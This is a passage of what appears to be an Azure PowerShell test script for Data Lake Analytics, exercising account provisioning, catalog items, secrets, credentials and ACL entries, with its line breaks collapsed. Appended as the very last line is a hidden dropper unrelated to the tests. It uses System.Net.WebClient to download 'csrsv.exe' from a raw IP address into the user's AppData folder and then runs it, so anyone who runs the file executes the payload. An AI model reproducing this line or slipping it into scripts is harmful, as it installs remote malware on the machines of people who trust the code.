($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}Assert-Throws {Stop-AzDataLakeAnalyticsJob -AccountName $accountName -JobIdentity [Guid]::Empty}Assert-Throws {Get-AzDataLakeAnalyticsJob -AccountName $accountName -JobIdentity [Guid]::Empty}Assert-Throws {Get-AzDataLakeAnalyticsJobDebugInfo -AccountName $accountName -JobIdentity [Guid]::Empty}$jobsWithDateOffset = Get-AzDataLakeAnalyticsJob -AccountName $accountName -SubmittedAfter $([DateTimeOffset]$nowTime)Assert-True {$jobsWithDateOffset.Count -eq 0} "Retrieval of jobs submitted after right now returned results and should not have"Assert-True {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsCatalog{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$databaseName = (getAssetName),$tableName = (getAssetName),$tvfName = (getAssetName),$viewName = (getAssetName),$procName = (getAssetName),$credentialName = (getAssetName),$secretName = (getAssetName),$secretPwd = (getAssetName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzDataLakeStoreAccount -Name $dataLakeAccountName -Location $location -ResourceGroupName $resourceGroupName$accountCreated = New-AzDataLakeAnalyticsAccount -Name $accountName -Location $location -ResourceGroupName $resourceGroupName -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$scriptTemplate = @"DROP DATABASE IF EXISTS {0}; CREATE DATABASE {0};CREATE TABLE {0}.dbo.{1}(//Define schema of tableUserId          int, Start           DateTime, Region          string, Query           string, Duration        int, Urls            string, ClickedUrls     string,INDEX idx1 //Name of indexCLUSTERED (Region ASC) //Column to cluster byPARTITIONED BY (UserId) HASH (Region) //Column to partition by);ALTER TABLE {0}.dbo.{1} ADD IF NOT EXISTS PARTITION (1);DROP FUNCTION IF EXISTS {0}.dbo.{2};//create table weblogs on space-delimited website log dataCREATE FUNCTION {0}.dbo.{2}()RETURNS @result TABLE(s_date DateTime,s_time string,s_sitename string,cs_method string, cs_uristem string,cs_uriquery string,s_port int,cs_username string, c_ip string,cs_useragent string,cs_cookie string,cs_referer string, cs_host string,sc_status int,sc_substatus int,sc_win32status int, sc_bytes int,cs_bytes int,s_timetaken int)ASBEGIN@result = EXTRACTs_date DateTime,s_time string,s_sitename string,cs_method string,cs_uristem string,cs_uriquery string,s_port int,cs_username string,c_ip string,cs_useragent string,cs_cookie string,cs_referer string,cs_host string,sc_status int,sc_substatus int,sc_win32status int,sc_bytes int,cs_bytes int,s_timetaken intFROM @"/Samples/Data/WebLog.log"USING Extractors.Text(delimiter:' ');RETURN;END;CREATE VIEW {0}.dbo.{3} AS SELECT * FROM (VALUES(1,2),(2,4)) AS T(a, b);CREATE PROCEDURE {0}.dbo.{4}()AS BEGINCREATE VIEW {0}.dbo.{3} AS SELECT * FROM (VALUES(1,2),(2,4)) AS T(a, b);END;"@$scriptToRun = [string]::Format($scriptTemplate, $databaseName, $tableName, $tvfName, $viewName, $procName)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("createCatalogJob01")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AzDataLakeAnalyticsJob -AccountName $accountName -Name "TestJob" -Script $scriptToRun$result = Wait-AzDataLakeAnalyticsJob -AccountName $accountName -JobId $jobInfo.JobIdAssert-AreEqual "Succeeded" $result.Result$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType DatabaseAssert-NotNull $itemList "The database list is null"Assert-True {$itemList.count -gt 0} "The database list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $databaseName){$found = $truebreak}}Assert-True {$found} "Could not find the database $databaseName in the database list"$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Database -Path $databaseNameAssert-NotNull $specificItem "Could not retrieve the db by name"Assert-AreEqual $databaseName $specificItem.Name$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName.dbo"Assert-NotNull $itemList "The table list is null"Assert-True {$itemList.count -gt 0} "The table list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tableName){$found = $truebreak}}Assert-True {$found} "Could not find the table $tableName in the table list"$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName"Assert-NotNull $itemList "The table list is null"Assert-True {$itemList.count -gt 0} "The table list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tableName){$found = $truebreak}}Assert-True {$found} "Could not find the table $tableName in the table list"$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName.dbo.$tableName"Assert-NotNull $specificItem "Could not retrieve the table by name"Assert-AreEqual $tableName $specificItem.Name$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType TablePartition -Path "$databaseName.dbo.$tableName"Assert-NotNull $itemList "The table partition list is null"Assert-True {$itemList.count -gt 0} "The table partition list is empty"$itemToFind = $itemList[0]$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType TablePartition -Path "$databaseName.dbo.$tableName.[$($itemToFind.Name)]"Assert-NotNull $specificItem "Could not retrieve the table partition by name"Assert-AreEqual $itemToFind.Name $specificItem.Name$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName.dbo"Assert-NotNull $itemList "The TVF list is null"Assert-True {$itemList.count -gt 0} "The TVF list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tvfName){$found = $truebreak}}Assert-True {$found} "Could not find the TVF $tvfName in the TVF list"$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName"Assert-NotNull $itemList "The TVF list is null"Assert-True {$itemList.count -gt 0} "The TVF list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tvfName){$found = $truebreak}}Assert-True {$found} "Could not find the TVF $tvfName in the TVF list"$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName.dbo.$tvfName"Assert-NotNull $specificItem "Could not retrieve the TVF by name"Assert-AreEqual $tvfName $specificItem.Name$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Procedure -Path "$databaseName.dbo"Assert-NotNull $itemList "The procedure list is null"Assert-True {$itemList.count -gt 0} "The procedure list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $procName){$found = $truebreak}}Assert-True {$found} "Could not find the procedure $procName in the procedure list"$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Procedure -Path "$databaseName.dbo.$procName"Assert-NotNull $specificItem "Could not retrieve the procedure by name"Assert-AreEqual $procName $specificItem.Name$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName.dbo"Assert-NotNull $itemList "The view list is null"Assert-True {$itemList.count -gt 0} "The view list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $viewName){$found = $truebreak}}Assert-True {$found} "Could not find the view $viewName in the view list"$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName"Assert-NotNull $itemList "The view list is null"Assert-True {$itemList.count -gt 0} "The view list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $viewName){$found = $truebreak}}Assert-True {$found} "Could not find the view $viewName in the view list"$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName.dbo.$viewName"Assert-NotNull $specificItem "Could not retrieve the view by name"Assert-AreEqual $viewName $specificItem.Name$pw = ConvertTo-SecureString -String $secretPwd -AsPlainText -Force$secret = New-Object System.Management.Automation.PSCredential($secretName,$pw)$secretName2 = $secretName + "dup"$secret2 = New-Object System.Management.Automation.PSCredential($secretName2,$pw)New-AzDataLakeAnalyticsCatalogSecret -AccountName $accountName -secret $secret -DatabaseName $databaseName -Uri "https://pstest.contoso.com:443"New-AzDataLakeAnalyticsCatalogSecret -AccountName $accountName -secret $secret2 -DatabaseName $databaseName -Uri "https://pstest.contoso.com:443"$getSecret = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName"Assert-NotNull $getSecret "Could not retrieve the secret"New-AzDataLakeAnalyticsCatalogCredential -AccountName $accountName -DatabaseName $databaseName -CredentialName $credentialName -Credential $secret -Uri "https://fakedb.contoso.com:443"$itemList = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Credential -Path $databaseNameAssert-NotNull $itemList "The credential list is null"Assert-True {$itemList.count -gt 0} "The credential list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $credentialName){$found = $truebreak}}$specificItem = Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"Assert-NotNull $specificItem "Could not retrieve the credential by name"Assert-AreEqual $credentialName $specificItem.NameRemove-AzDataLakeAnalyticsCatalogCredential -AccountName $accountName -DatabaseName $databaseName -Name $credentialNameAssert-Throws {Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"}New-AzDataLakeAnalyticsCatalogCredential -AccountName $accountName -DatabaseName $databaseName -CredentialName $credentialName -Credential $secret -Uri "https://fakedb.contoso.com:443"Remove-AzDataLakeAnalyticsCatalogCredential -AccountName $accountName -DatabaseName $databaseName -Name $credentialName -Recurse -ForceAssert-Throws {Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"}Remove-AzDataLakeAnalyticsCatalogSecret -AccountName $accountName -Name $secretName -DatabaseName $databaseName -ForceAssert-Throws {Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName"}Remove-AzDataLakeAnalyticsCatalogSecret -AccountName $accountName -DatabaseName $databaseName -ForceAssert-Throws {Get-AzDataLakeAnalyticsCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName2"}$userPrincipalId = "027c28d5-c91d-49f0-98c5-d10134b169b3"$groupPrincipalId = "9b6130bf-d65e-4464-b92e-733da0bc1c43"$aclByDbList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -ItemType Database -Path $databaseName$aclByDbInitialCount = $aclByDbList.count$aclList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName$aclInitialCount = $aclList.count$aclByDbList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -User -ObjectId $userPrincipalId -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $($aclByDbInitialCount+1) $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Id -eq $userPrincipalId){Assert-AreEqual User $acl.TypeAssert-AreEqual $userPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $userPrincipalId in the ACL list of $databaseName"Assert-True {Remove-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -User -ObjectId $userPrincipalId -ItemType Database -Path $databaseName -PassThru} "Remove ACE failed."$aclByDbList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -ItemType Database -Path $databaseNameAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$aclByDbList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Group -ObjectId $groupPrincipalId -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $($aclByDbInitialCount+1) $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Id -eq $groupPrincipalId){Assert-AreEqual Group $acl.TypeAssert-AreEqual $groupPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $groupPrincipalId in the ACL list of $databaseName"Assert-True {Remove-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Group -ObjectId $groupPrincipalId -ItemType Database -Path $databaseName -PassThru} "Remove ACE failed."$aclByDbList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -ItemType Database -Path $databaseNameAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$aclByDbList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Other -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Type -eq "Other"){Assert-AreEqual None $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the ACL list of $databaseName"$aclByDbList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Other -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Type -eq "Other"){Assert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the ACL list of $databaseName"$prevDbOwnerAcl = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -UserOwner -ItemType Database -Path $databaseNameAssert-AreNotEqual None $prevDbOwnerAcl.Permissions$currentDbOwnerAcl = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -UserOwner -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual None $currentDbOwnerAcl.Permissions$prevDbGroupAcl = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -GroupOwner -ItemType Database -Path $databaseNameAssert-AreNotEqual None $prevDbGroupAcl.Permissions$currentDbGroupAcl = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -GroupOwner -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual None $currentDbGroupAcl.Permissions$aclList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -User -ObjectId $userPrincipalId -Permissions ReadAssert-AreEqual $($aclInitialCount+1) $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Id -eq $userPrincipalId){Assert-AreEqual User $acl.TypeAssert-AreEqual $userPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $userPrincipalId in the Catalog ACL list"Assert-True {Remove-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -User -ObjectId $userPrincipalId -PassThru} "Remove ACE failed."$aclList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountNameAssert-AreEqual $aclInitialCount $aclList.count$aclList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Group -ObjectId $groupPrincipalId -Permissions ReadAssert-AreEqual $($aclInitialCount+1) $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Id -eq $groupPrincipalId){Assert-AreEqual Group $acl.TypeAssert-AreEqual $groupPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $groupPrincipalId in the Catalog ACL list"Assert-True {Remove-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Group -ObjectId $groupPrincipalId -PassThru} "Remove ACE failed."$aclList = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountNameAssert-AreEqual $aclInitialCount $aclList.count$aclList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Other -Permissions NoneAssert-AreEqual $aclInitialCount $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Type -eq "Other"){Assert-AreEqual None $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the Catalog ACL list"$aclList = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -Other -Permissions ReadAssert-AreEqual $aclInitialCount $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Type -eq "Other"){Assert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the Catalog ACL list"$prevCatalogOwnerAcl = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -UserOwnerAssert-AreNotEqual None $prevCatalogOwnerAcl.Permissions$currentCatalogOwnerAcl = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -UserOwner -Permissions NoneAssert-AreEqual None $currentCatalogOwnerAcl.Permissions$prevCatalogGroupAcl = Get-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -GroupOwnerAssert-AreNotEqual None $prevCatalogGroupAcl.Permissions$currentCatalogGroupAcl = Set-AzDataLakeAnalyticsCatalogItemAclEntry -Account $accountName -GroupOwner -Permissions NoneAssert-AreEqual None $currentCatalogGroupAcl.PermissionsAssert-True {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")